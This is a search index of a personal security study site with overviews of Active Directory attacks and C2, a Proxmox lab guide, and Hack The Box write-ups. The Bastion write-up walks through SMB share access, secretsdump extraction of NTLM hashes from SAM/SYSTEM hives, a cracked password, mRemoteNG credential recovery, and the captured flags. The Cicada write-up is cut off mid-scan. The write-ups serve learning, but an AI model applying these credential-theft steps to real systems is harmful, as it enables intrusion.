{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Playroom Security Material for MkDocs","text":"<p>Welcome to Playroom Security Material for MkDocs.</p>"},{"location":"active-directory/","title":"Active Directory Attacks","text":"<p>This section covers various attacks that can be performed against Active Directory (AD) environments. AD is a widely used directory service in Windows-based networks, and understanding these attacks is crucial for securing such environments.</p>"},{"location":"active-directory/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Introduction to Active Directory Attacks</li> <li>Common Active Directory Attacks</li> <li>Detection and Mitigation Strategies</li> <li>Conclusion</li> <li>References</li> </ul>"},{"location":"active-directory/#introduction-to-active-directory-attacks","title":"Introduction to Active Directory Attacks","text":"<p>Active Directory (AD) is a critical component of many enterprise networks, providing authentication and authorization services. Due to its central role, AD is a prime target for attackers seeking to gain unauthorized access or escalate privileges within a network. This document explores common AD attacks, their methodologies, and strategies for detection and mitigation.</p>"},{"location":"active-directory/#common-active-directory-attacks","title":"Common Active Directory Attacks","text":""},{"location":"active-directory/#1-pass-the-hash-pth","title":"1. Pass-the-Hash (PtH)","text":"<p>Pass-the-Hash is an attack technique where an attacker captures the hashed password of a user and uses it to authenticate without needing to know the actual password. This is often done by extracting hashes from memory or the SAM database.</p>"},{"location":"active-directory/#2-kerberoasting","title":"2. Kerberoasting","text":"<p>Kerberoasting involves requesting service tickets for service accounts in AD and then attempting to crack the ticket offline to retrieve the plaintext password. This attack targets service accounts that often have elevated privileges.</p>"},{"location":"active-directory/#3-golden-ticket-attack","title":"3. Golden Ticket Attack","text":"<p>A Golden Ticket attack involves creating a forged Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account's hash. This allows attackers to impersonate any user in the domain, including domain administrators.</p>"},{"location":"active-directory/#4-silver-ticket-attack","title":"4. Silver Ticket Attack","text":"<p>Similar to the Golden Ticket attack, the Silver Ticket attack involves forging service tickets (TGS) for specific services. This attack is less powerful than the Golden Ticket but can still provide access to targeted services.</p>"},{"location":"active-directory/#5-dcsync-attack","title":"5. DCSync Attack","text":"<p>DCSync is an attack that allows an attacker to simulate the behavior of a domain controller and request password hashes and other sensitive information from AD. This is typically done using tools like Mimikatz.</p>"},{"location":"active-directory/#6-ldap-injection","title":"6. LDAP Injection","text":"<p>LDAP Injection is a technique where an attacker exploits vulnerabilities in applications that interact with AD via LDAP queries. By injecting malicious LDAP statements, attackers can manipulate queries to gain unauthorized access or extract sensitive information.</p>"},{"location":"active-directory/#7-sid-history-injection","title":"7. SID History Injection","text":"<p>SID History Injection involves adding a malicious Security Identifier (SID) to a user's SID history attribute. This can allow the user to inherit permissions from another account, potentially escalating privileges.</p>"},{"location":"active-directory/#detection-and-mitigation-strategies","title":"Detection and Mitigation Strategies","text":""},{"location":"active-directory/#detection","title":"Detection","text":"<ul> <li>Monitor for unusual authentication patterns, such as multiple failed login attempts or logins from unexpected locations.</li> <li>Use Security Information and Event Management (SIEM) systems to analyze logs for signs of PtH, Kerberoasting, and other AD attacks.</li> <li>Implement honeypots to detect unauthorized access attempts.</li> </ul>"},{"location":"active-directory/#mitigation","title":"Mitigation","text":"<ul> <li>Enforce strong password policies and use multi-factor authentication (MFA) to reduce the risk of credential theft.</li> <li>Regularly update and patch AD servers and related infrastructure to mitigate vulnerabilities.</li> <li>Limit the use of privileged accounts and implement the principle of least privilege.              </li> </ul>"},{"location":"alternatives/","title":"Alternatives","text":"<p>There are tons of static site generators and themes out there and choosing the right one for your tech stack is a tough decision. If you're unsure if Material for MkDocs is the right solution for you, this section should help you evaluate alternative solutions.</p>"},{"location":"alternatives/#docusaurus","title":"Docusaurus","text":"<p>Docusaurus by Facebook is a very popular documentation generator and a good choice if you or your company are already using React to build your site. It will generate a single page application which is fundamentally different from the site Material for MkDocs generates for you.</p> <p>Advantages</p> <ul> <li>Very powerful, customizable and extendable</li> <li>Provides many components that aid in technical writing</li> <li>Large and rich ecosystem, backed by Facebook</li> </ul> <p>Challenges</p> <ul> <li>High learning curve, JavaScript knowledge mandatory</li> <li>JavaScript ecosystem is very volatile, rather high maintenance</li> <li>More time needed to get up and running</li> </ul> <p>While Docusaurus is one of the best choices when it comes to documentation sites that output a single page application, there are many more solutions, including Docz, Gatsby, Vuepress and Docsify that approach this problem similarly.</p>"},{"location":"alternatives/#jekyll","title":"Jekyll","text":"<p>Jekyll is probably one of the most mature and widespread static site generators and is written in Ruby. It is not specifically geared towards technical project documentation and has many themes to choose from, which can be challenging.</p> <p>Advantages</p> <ul> <li>Battle-tested, rich ecosystem, many themes to choose from</li> <li>Brings great capabilities for blogging  (permalinks, tags, etc.)</li> <li>Generates a SEO-friendly site, similar to Material for MkDocs</li> </ul> <p>Challenges</p> <ul> <li>Not specifically geared towards technical project documentation</li> <li>Limited Markdown capabilities, not as advanced as Python Markdown</li> <li>More time needed to get up and running</li> </ul>"},{"location":"alternatives/#sphinx","title":"Sphinx","text":"<p>Sphinx is an alternative static site generator specifically geared towards generating reference documentation, offering powerful capabilities that are lacking in MkDocs. It uses reStructured text, a format similar to Markdown, which some users find harder to use.</p> <p>Advantages</p> <ul> <li>Very powerful, customizable and extendable</li> <li>Generates reference documentation from Python docstrings</li> <li>Large and rich ecosystem, used by many Python projects</li> </ul> <p>Challenges</p> <ul> <li>High learning curve, reStructured text syntax might be challenging</li> <li>Search is less powerful than the one provided by MkDocs</li> <li>More time needed to get up and running</li> </ul> <p>If you're considering using Sphinx because you need to generate reference documentation, you should give mkdocstrings a try \u2013 an actively maintained and popular framework building on top of MkDocs, implementing Sphinx-like functionality.</p>"},{"location":"alternatives/#gitbook","title":"GitBook","text":"<p>GitBook offers a hosted documentation solution that generates a beautiful and functional site from Markdown files in your GitHub repository. However, it was once Open Source, but turned into a closed source solution some time ago.</p> <p>Advantages</p> <ul> <li>Hosted solution, minimal technical knowledge required</li> <li>Custom domains, authentication and other enterprise features</li> <li>Great collaboration features for teams</li> </ul> <p>Challenges</p> <ul> <li>Closed source, not free for proprietary projects</li> <li>Limited Markdown capabilities, not as advanced as Python Markdown</li> <li>Many Open Source projects moved away from GitBook</li> </ul> <p>Many users switched from GitBook to Material for MkDocs, as they want to keep control and ownership of their documentation, favoring an Open Source solution.</p>"},{"location":"c2/","title":"C2 Framework","text":"<p>Command and Control (C2) is a critical component in cybersecurity operations, enabling attackers to maintain communication with compromised systems. This document explores the various aspects of C2, including its architecture, techniques, and mitigation strategies.</p>"},{"location":"c2/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Introduction to Command and Control</li> <li>C2 Architecture</li> <li>Common C2 Techniques</li> <li>Detection and Mitigation</li> <li>Conclusion</li> <li>References</li> </ul>"},{"location":"c2/#introduction-to-command-and-control","title":"Introduction to Command and Control","text":"<p>Command and Control (C2) refers to the methods and infrastructure used by attackers to communicate with compromised systems within a target network. C2 channels allow attackers to issue commands, exfiltrate data, and maintain persistence.  Understanding C2 is essential for developing effective defense strategies against cyber threats.    </p>"},{"location":"c2/#c2-architecture","title":"C2 Architecture","text":"<p>C2 architectures can vary significantly, but they generally fall into two main categories: centralized and decentralized.   - Centralized C2: In this model, a single server or a small number of servers control the compromised systems. This approach is easier to manage but can be more vulnerable to takedown efforts.   - Decentralized C2: This model uses multiple servers or peer-to-peer networks to distribute control. This approach is more resilient to takedown attempts but can be more complex to manage.   </p>"},{"location":"c2/#common-c2-techniques","title":"Common C2 Techniques","text":"<p>Attackers employ various techniques to establish and maintain C2 channels, including: - HTTP/HTTPS: Using web protocols to blend in with normal traffic. - DNS Tunneling: Leveraging DNS queries and responses to transmit data. - Email: Using email servers to send and receive commands. - Social Media: Utilizing platforms like Twitter or Facebook for C2 communication. - Custom Protocols: Developing proprietary protocols to evade detection.    </p>"},{"location":"c2/#detection-and-mitigation","title":"Detection and Mitigation","text":"<p>Detecting and mitigating C2 activities involves a combination of network monitoring, threat intelligence, and endpoint security measures. Key strategies include: - Network Traffic Analysis: Monitoring for unusual patterns or anomalies in network traffic. - Behavioral Analysis: Identifying abnormal behaviors on endpoints that may indicate C2 activity. - Threat Intelligence: Leveraging threat intelligence feeds to stay informed about known C2 infrastructures. - Incident Response: Establishing a robust incident response plan to quickly address C2 incidents. </p>"},{"location":"c2/#conclusion","title":"Conclusion","text":"<p>Understanding Command and Control is vital for cybersecurity professionals to defend against sophisticated cyber threats. By recognizing C2 architectures and techniques, organizations can implement effective detection and mitigation strategies to protect their networks. </p>"},{"location":"c2/#references","title":"References","text":"<ul> <li>MITRE ATT&amp;CK Framework</li> <li>NIST Special Publication 800-61</li> <li>SANS Institute: Command and Control </li> </ul>"},{"location":"osi-model/","title":"OSI Model","text":""},{"location":"osi-model/#osi-model-the-seven-layers-of-networking","title":"OSI Model: The Seven Layers of Networking","text":"<p>The OSI (Open Systems Interconnection) model is a conceptual framework used to understand and implement network protocols in seven distinct layers. Each layer serves a specific function and communicates with the layers directly above and below it. Here are the seven layers of the OSI model: </p> Physical Layer (Layer 1) <p>This layer is responsible for the physical connection between devices, including cables, switches, and other hardware. It deals with the transmission and reception of raw bit streams over a physical medium.</p> Data Link Layer (Layer 2) <p>This layer provides error detection and correction for data transmitted over the physical layer. It is responsible for framing, addressing (using MAC addresses), and managing access to the physical medium.</p> Network Layer (Layer 3) <p>The network layer is responsible for routing data packets between devices across different networks. It uses logical addressing (such as IP addresses) to determine the best path for data transmission.</p> Transport Layer (Layer 4) <p>This layer ensures reliable data transfer between devices. It manages end-to-end communication, error recovery, and flow control. Common protocols at this layer include TCP (Transmission Control Protocol) and UDP (User Datagram Protocol).</p> Session Layer (Layer 5) <p>The session layer manages sessions or connections between applications. It establishes, maintains, and terminates connections, ensuring that data is properly synchronized and organized.</p> Presentation Layer (Layer 6) <p>This layer is responsible for data translation, encryption, and compression. It ensures that data is presented in a format that the application layer can understand, regardless of the underlying system architecture.</p> Application Layer (Layer 7) <p>The application layer is the closest to the end user and provides network services directly to applications. It includes protocols such as HTTP, FTP, SMTP, and DNS, which facilitate various types of communication over the network.</p> <p>Understanding the OSI model is essential for network design, troubleshooting, and security, as it provides a structured approach to analyzing and managing network interactions.   </p>"},{"location":"osi-model/#diagram","title":"Diagram","text":""},{"location":"proxmox-home-lab/","title":"Building a Proxmox Cybersecurity Home Lab","text":"<p>This guide provides step-by-step instructions to set up a Proxmox home lab tailored for cybersecurity enthusiasts. It covers the installation of Proxmox VE, configuration of virtual machines, and best practices for creating a secure and efficient lab environment.</p> <p></p>"},{"location":"proxmox-home-lab/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Introduction</li> <li>Prerequisites</li> <li>Installing Proxmox VE</li> <li>Configuring Proxmox VE</li> <li>Creating Virtual Machines</li> <li>Networking Setup </li> <li>Security Best Practices</li> <li>Conclusion</li> </ul>"},{"location":"proxmox-home-lab/#introduction","title":"Introduction","text":"<p>A Proxmox home lab provides a versatile platform for learning and experimenting with various cybersecurity tools and techniques. By leveraging virtualization, users can create isolated environments to test vulnerabilities, practice penetration testing, and simulate attacks without risking their primary systems.   </p>"},{"location":"proxmox-home-lab/#prerequisites","title":"Prerequisites","text":"<p>Before starting, ensure you have the following: - A computer with at least 8GB of RAM and a multi-core processor. - A minimum of 100GB of free disk space. - A USB drive (at least 4GB) for Proxmox installation media. - A stable internet connection for downloading Proxmox VE and updates. - Basic knowledge of networking and virtualization concepts.</p>"},{"location":"proxmox-home-lab/#installing-proxmox-ve","title":"Installing Proxmox VE","text":"<ol> <li>Download the latest Proxmox VE ISO from the official Proxmox website.</li> <li>Create a bootable USB drive using tools like Rufus or Etcher.</li> <li>Boot your computer from the USB drive and follow the on-screen instructions to install Proxmox VE.</li> <li>After installation, access the Proxmox web interface by navigating to <code>https://&lt;your-server-ip&gt;:8006</code> in your web browser.</li> <li>Log in using the root account and the password you set during installation.</li> </ol>"},{"location":"proxmox-home-lab/#configuring-proxmox-ve","title":"Configuring Proxmox VE","text":"<ol> <li>Update Proxmox VE to the latest version by running the following commands in the terminal:    <pre><code>apt update\napt upgrade -y\n</code></pre></li> <li>Configure storage by adding local or network storage options in the Proxmox web interface.</li> <li>Set up backups to ensure your virtual machines and configurations are safe.</li> </ol>"},{"location":"proxmox-home-lab/#creating-virtual-machines","title":"Creating Virtual Machines","text":"<ol> <li>In the Proxmox web interface, click on \"Create VM\" to start the virtual machine creation wizard.</li> <li>Choose a name for your VM and select the appropriate OS type (e.g., Linux, Windows).</li> <li>Allocate resources such as CPU, RAM, and disk space based on your requirements.</li> <li>Install the operating system by mounting an ISO image or using a network installation method.</li> <li>Repeat the process to create multiple VMs for different cybersecurity tools and environments.</li> </ol>"},{"location":"proxmox-home-lab/#networking-setup","title":"Networking Setup","text":"<ol> <li>Configure virtual networks to isolate different VMs and simulate real-world network scenarios.</li> <li>Use Proxmox's built-in firewall to create rules that control traffic between VMs.</li> <li>Set up NAT or bridged networking based on your lab requirements.     </li> </ol>"},{"location":"proxmox-home-lab/#security-best-practices","title":"Security Best Practices","text":"<ol> <li>Regularly update Proxmox VE and all installed VMs to patch vulnerabilities.</li> <li>Use strong passwords and enable two-factor authentication for Proxmox access.</li> <li>Limit access to the Proxmox web interface by configuring firewall rules.</li> <li>Monitor logs and network traffic for any suspicious activity.</li> <li>Create snapshots of VMs before making significant changes to easily revert if needed.</li> </ol>"},{"location":"proxmox-home-lab/#conclusion","title":"Conclusion","text":"<p>Setting up a Proxmox cybersecurity home lab is an excellent way to enhance your skills and knowledge in a controlled environment. By following this guide, you can create a versatile and secure lab that allows you to experiment with various cybersecurity tools and techniques safely. Happy learning!  </p>"},{"location":"blog/","title":"Blog","text":""},{"location":"htb/labs/","title":"List of HTB Labs","text":""},{"location":"htb/labs/#easy","title":"Easy","text":"Lab Name Writeup Link Bastion Retire Writeup Easy 2 Writeup Easy 3 Writeup"},{"location":"htb/labs/easy/bastion-retire/","title":"Bastion retire","text":"<p>This is a writeup for the HTB machine Bastion (Retire).</p>"},{"location":"htb/labs/easy/bastion-retire/#bastion","title":"Bastion","text":"<ul> <li>IP Address: <code>10.10.10.134</code></li> <li>Difficulty: Easy</li> <li>Operating System: Windows</li> </ul> Warning <p>\"This machine is retired on HTB. You will need an active VIP subscription to access it.\"</p> <p>I will start off with a <code>nmap scan</code> to see what services are running.</p>"},{"location":"htb/labs/easy/bastion-retire/#enumeration","title":"Enumeration","text":"<pre><code>nmap -sC -sV 10.10.10.134 -Pn --unprivileged                                                                \ue0b2 \uf00c \ue0b2\nStarting Nmap 7.95 ( https://nmap.org ) at 2024-12-24 19:44 Eastern Standard Time\nNmap scan report for 10.10.10.134\nHost is up (0.13s latency).\nNot shown: 995 filtered tcp ports (no-response)\nPORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)\n| ssh-hostkey:\n|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)\n|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)\n|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds\n5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Bastion\n|   NetBIOS computer name: BASTION\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-12-25T01:44:56+01:00\n|_clock-skew: mean: -19m58s, deviation: 34m35s, median: 0s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2024-12-25T00:44:57\n|_  start_date: 2024-12-24T20:12:40\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 45.11 seconds\n</code></pre>"},{"location":"htb/labs/easy/bastion-retire/#smb-enumeration","title":"SMB Enumeration","text":"<pre><code>\u250c\u2500(C:\\Users\\dcyberguy\\pipx\\venvs\\impacket\\Scripts)\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500(dcyberguy@PLAYROOM-WIN)\u2500\u2510\n\u2514\u2500(20:02:23)\u2500\u2500&gt; netexec smb 10.10.10.134 -u '' -p '' --shares                                                      2 \u21b5 \u2500\u2500(Tue,Dec24)\u2500\u2518\nSMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)\nSMB         10.10.10.134    445    BASTION          [+] Bastion\\'':'' (Guest)\nSMB         10.10.10.134    445    BASTION          [*] Enumerated shares\nSMB         10.10.10.134    445    BASTION          Share           Permissions     Remark\nSMB         10.10.10.134    445    BASTION          -----           -----------     ------\nSMB         10.10.10.134    445    BASTION          ADMIN$                          Remote Admin\nSMB         10.10.10.134    445    BASTION          Backups         READ,WRITE\nSMB         10.10.10.134    445    BASTION          C$                              Default share\nSMB         10.10.10.134    445    BASTION          IPC$                            Remote IPC\n</code></pre> <p>Using the <code>net view</code> command to view the contents of the ALL the shares for the <code>BASTION</code> host.</p> <p><pre><code>\u250c\u2500(C:\\Users\\dcyberguy\\pipx\\venvs\\impacket\\Scripts)\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500(dcyberguy@PLAYROOM-WIN)\u2500\u2510\n\u2514\u2500(20:14:29)\u2500\u2500&gt; net view \\\\10.10.10.134 /all                                                                           \u2500\u2500(Tue,Dec24)\u2500\u2518\nShared resources at \\\\10.10.10.134\n\nShare name  Type  Used as  Comment\n\n-------------------------------------------------------------------------------\nADMIN$      Disk           Remote Admin\nBackups     Disk\nC$          Disk           Default share\nIPC$        IPC            Remote IPC\nThe command completed successfully.\n</code></pre> The <code>Backups</code> share is the only share that we can access. Let's connect to it and see what files are there.</p> <pre><code>smbclient //10.10.10.134/Backups                                                                                                        \nPassword for [WORKGROUP\\d-cyberguy]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Tue Dec 24 20:03:53 2024\n  ..                                  D        0  Tue Dec 24 20:03:53 2024\n  CquJsHSVUK.txt                      A        0  Tue Dec 24 20:03:53 2024\n  note.txt                           AR      116  Tue Apr 16 06:10:09 2019\n  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019\n  tpBJOVSnoI                          D        0  Tue Dec 24 20:03:52 2024\n  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019\n\n                5638911 blocks of size 4096. 1172070 blocks available\nsmb: \\&gt; get note.txt\ngetting file \\note.txt of size 116 as note.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)\nsmb: \\&gt; get CquJsHSVUK.txt\ngetting file \\CquJsHSVUK.txt of size 0 as CquJsHSVUK.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p>I will use my local windows hacking machine to read the contents of the <code>WindowsImageBackup</code> file.</p> <p></p> <p>To crack the DB we need the SAM and SYSTEM hives. They are located at <code>C:\\WIndows\\System32\\config\\SAM and C:\\Windows\\System32\\config\\SYSTEM.</code></p> <p>Save them locally on your device and then run:</p> <p>I used <code>secretdumpy</code> to dump out the credentials from the SAM and SYSTEM hives.</p> <pre><code>\u250c\u2500(C:\\Users\\dcyberguy\\pipx\\venvs\\impacket\\Scripts)\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500(dcyberguy@PLAYROOM-WIN)\u2500\u2510\n\u2514\u2500(21:36:14)\u2500\u2500&gt; python secretsdump.py -sam C:\\Users\\dcyberguy\\Desktop\\SAM -system C:\\Users\\dcyberguy\\Desktop\\SYSTEM LOCAL\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nL4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::\n[*] Cleaning up...\n</code></pre> <p>If we take the NTLM hash to <code>Crackstation</code> we get: <code>bureaulampje</code></p> <p></p>"},{"location":"htb/labs/easy/bastion-retire/#getting-a-shell","title":"Getting a Shell","text":"<p>Using <code>SSH</code> to get a shell on the box. <pre><code>ssh l4mpje@10.10.10.134                                                                                     \ue0b2 \uf00c \ue0b2\nThe authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.\nED25519 key fingerprint is SHA256:2ZbIDKRPlngECX1WSMqnucdOWthIaPG7wQ6mBReac7M.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.134' (ED25519) to the list of known hosts.\nl4mpje@10.10.10.134's password:\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nl4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\L4mpje\\Desktop\n\n22-02-2019  15:27    &lt;DIR&gt;          .\n22-02-2019  15:27    &lt;DIR&gt;          ..\n24-12-2024  21:13                34 user.txt\n               1 File(s)             34 bytes\n               2 Dir(s)   4.732.170.240 bytes free\n\nl4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;type user.txt\n4f618369c53e1f5aede7d039e84b5870\n</code></pre></p>"},{"location":"htb/labs/easy/bastion-retire/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using <code>winPEAS</code> to enumerate the box for potential privilege escalation vectors. We can also see that it has the <code>mRemote Remote connection</code> tool and it's insecure credentials can be located at </p> <pre><code>l4mpje@BASTION C:\\Program Files (x86)\\mRemoteNG&gt;cd C:\\Users\\L4mpje\\AppData\\Roaming\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\L4mpje\\AppData\\Roaming\n\n22-02-2019  14:01    &lt;DIR&gt;          .\n22-02-2019  14:01    &lt;DIR&gt;          ..\n22-02-2019  13:50    &lt;DIR&gt;          Adobe\n22-02-2019  14:03    &lt;DIR&gt;          mRemoteNG\n               0 File(s)              0 bytes\n               4 Dir(s)   4.732.039.168 bytes free\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming&gt;cd mRemoteNG\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\n\n22-02-2019  14:03    &lt;DIR&gt;          .\n22-02-2019  14:03    &lt;DIR&gt;          ..\n22-02-2019  14:03             6.316 confCons.xml\n22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup\n22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup\n22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup\n22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup\n22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup\n22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup\n22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup\n22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup\n22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup\n22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup\n22-02-2019  14:03                51 extApps.xml\n25-12-2024  04:59             6.370 mRemoteNG.log\n22-02-2019  14:03             2.245 pnlLayout.xml\n22-02-2019  14:01    &lt;DIR&gt;          Themes\n              14 File(s)         77.730 bytes\n               3 Dir(s)   4.732.039.168 bytes free\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&gt;      \n</code></pre> <p>Let's transfer the <code>confCons.xml</code> locally, so that we can be able to obtain the administrators credentials.</p> <pre><code>scp l4mpje@10.10.10.134:\\users\\l4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xml confCons.xml                   \ue0b2 \uf071 \ue0b2\nl4mpje@10.10.10.134's password:\nconfCons.xml      \n</code></pre> <p>Now navigate to the confCons.xml file and import it. Once it\u2019s imported go to Tools &gt; External Tools. Then right-click in the white space and choose New External Tool. Next, in the External Tools Properties, fill in a Display Name, Filename and some arguments, with Password lookup,</p> <p></p> <p>Now right click on DC and click on Tools &gt; New External Tool name A prompt should appear above which the password is echoed.</p> <p></p> <p>Now that we can have the Administrator's password. Let's login as Administrator using SSH.</p> <p><pre><code>ssh administrator@10.10.10.134                                                                              \ue0b2 \uf00c \ue0b2\nadministrator@10.10.10.134's password:\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nadministrator@BASTION C:\\Users\\Administrator&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\Administrator\n\n25-04-2019  05:08    &lt;DIR&gt;          .\n25-04-2019  05:08    &lt;DIR&gt;          ..\n23-02-2019  09:40    &lt;DIR&gt;          Contacts\n23-02-2019  09:40    &lt;DIR&gt;          Desktop\n23-02-2019  09:40    &lt;DIR&gt;          Documents\n23-02-2019  09:40    &lt;DIR&gt;          Downloads\n23-02-2019  09:40    &lt;DIR&gt;          Favorites\n23-02-2019  09:40    &lt;DIR&gt;          Links\n23-02-2019  09:40    &lt;DIR&gt;          Music\n23-02-2019  09:40    &lt;DIR&gt;          Pictures\n23-02-2019  09:40    &lt;DIR&gt;          Saved Games\n23-02-2019  09:40    &lt;DIR&gt;          Searches\n23-02-2019  09:40    &lt;DIR&gt;          Videos\n               0 File(s)              0 bytes\n              13 Dir(s)   4.731.777.024 bytes free\n\nadministrator@BASTION C:\\Users\\Administrator&gt;\nadministrator@BASTION C:\\Users\\Administrator&gt;cd Desktop\n\nadministrator@BASTION C:\\Users\\Administrator\\Desktop&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n23-02-2019  09:40    &lt;DIR&gt;          .\n23-02-2019  09:40    &lt;DIR&gt;          ..\n24-12-2024  21:13                34 root.txt\n               1 File(s)             34 bytes\n               2 Dir(s)   4.731.777.024 bytes free\n\nadministrator@BASTION C:\\Users\\Administrator\\Desktop&gt;type root.txt\n65d972bb7722585f7de00a856984c1ea\n</code></pre> We have successfully rooted the box!</p>"},{"location":"htb/labs/easy/cicada-retire/","title":"Cicada retire","text":"<p>This is a writeup for the HTB machine Cicada (Retire).</p>"},{"location":"htb/labs/easy/cicada-retire/#cicada","title":"Cicada","text":"<ul> <li>IP Address: <code>10.10.11.35</code></li> <li>Difficulty: Easy</li> <li>Operating System: Windows</li> <li>Tags: <code>Active Directory</code>, <code>Windows</code>, <code>Enumeration</code>, <code>Privilege Escalation</code></li> </ul> Warning <p>\"This machine is retired on HTB. You will need an active VIP subscription to access it.\"</p> <p>I will start off with a <code>nmap scan</code> to see what services are running.</p>"},{"location":"htb/labs/easy/cicada-retire/#enumeration","title":"Enumeration","text":"<p><pre><code>nmap -sCV 10.10.11.35 -Pn                                                                                       took \uf252  5s at \uf017  05:43:08 PM\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 17:43 EDT\nNmap scan report for 10.10.11.35\nHost is up (0.10s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-19 04:43:35Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not 